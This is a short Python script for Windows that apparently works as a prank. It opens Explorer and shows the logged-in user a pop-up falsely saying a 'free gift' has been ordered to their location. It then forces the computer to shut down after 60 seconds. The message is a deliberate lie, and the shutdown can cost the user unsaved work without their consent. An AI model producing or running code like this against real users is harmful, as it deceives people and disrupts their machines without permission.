import subprocess


subprocess.run("start explorer", shell=True)
subprocess.run("msg %username% Your free gift has been ordered to your location! It will arrive in around 2-3 weeks.", shell=True)

subprocess.run("shutdown /s /t 60", shell=True)
